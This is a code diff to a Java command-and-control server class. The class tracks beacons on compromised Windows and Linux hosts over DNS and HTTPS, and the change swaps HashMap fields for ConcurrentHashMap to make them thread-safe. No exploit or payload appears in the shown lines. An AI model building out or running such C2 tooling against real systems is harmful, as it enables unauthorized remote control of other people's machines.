@@ -28,22 +28,22 @@ import Servers.encryption.aes.*;
 import Servers.encryption.rsa.*;
 
 public class C2Server implements Runnable{
-    private HashMap<String, String> usernamesPasswords;
+    private ConcurrentHashMap<String, String> usernamesPasswords;
 
     // Dictionary of all of the longRangeBeacons currently reporting back to the C2
     // Formatted IP Address, Duplexer Pointer
-    private HashMap<String, C2ServerBeaconHandler> longRangeBeacons;
-    private HashMap<String, String> beaconClientDnsMap;
-    private HashMap<String, String> beaconClientHttpsMap;
-    private HashMap<String, Boolean> isBeaconHTTP;
+    private ConcurrentHashMap<String, C2ServerBeaconHandler> longRangeBeacons;
+    private ConcurrentHashMap<String, String> beaconClientDnsMap;
+    private ConcurrentHashMap<String, String> beaconClientHttpsMap;
+    private ConcurrentHashMap<String, Boolean> isBeaconHTTP;
 
     // Dictionaries to Map IP's to Client responses
     private HashMap<String,ArrayList<String>> windowsClientResponses;
     private HashMap<String,ArrayList<String>> linuxClientResponses;
 
     // Dictionary to map IP Addresses to time last seen
-    private HashMap<String, Time> clientLastSeen;
-    private HashMap<String, Time> dnsClientLastSeen;
+    private ConcurrentHashMap<String, Time> clientLastSeen;
+    private ConcurrentHashMap<String, Time> dnsClientLastSeen;
 
     // Bionded Server Socket
     private ServerSocket serverSocket;
@@ -91,20 +91,20 @@ public class C2Server implements Runnable{
     public C2Server() throws IOException{
         this.shellLock = new Object();
         this.shellID = 0;
-        this.longRangeBeacons = new HashMap<>();
+        this.longRangeBeacons = new ConcurrentHashMap<>();
         this.serverSocket = new ServerSocket(1234);
         this.apiHandler = new C2ServerAPI(this);
         this.rsa = new rsa(1024);
         this.windowsClientResponses = new HashMap<>();
         this.linuxClientResponses = new HashMap<>();
-        this.usernamesPasswords = new HashMap<>();
+        this.usernamesPasswords = new ConcurrentHashMap<>();
         this.userInputScanner = new Scanner(System.in);
         this.userMessageList = new HashMap<>();
-        this.clientLastSeen = new HashMap<>();
-        this.dnsClientLastSeen = new HashMap<>();
-        this.beaconClientHttpsMap = new HashMap<>();
-        this.beaconClientDnsMap = new HashMap<>();
-        this.isBeaconHTTP = new HashMap<>();
+        this.clientLastSeen = new ConcurrentHashMap<>();
+        this.dnsClientLastSeen = new ConcurrentHashMap<>();
+        this.beaconClientHttpsMap = new ConcurrentHashMap<>();
+        this.beaconClientDnsMap = new ConcurrentHashMap<>();
+        this.isBeaconHTTP = new ConcurrentHashMap<>();
         // core=2, max=8, 60s keep-alive, bounded queue of 500.
         // CallerRunsPolicy applies backpressure instead of spawning unbounded
         // threads or silently dropping updates when the queue fills.
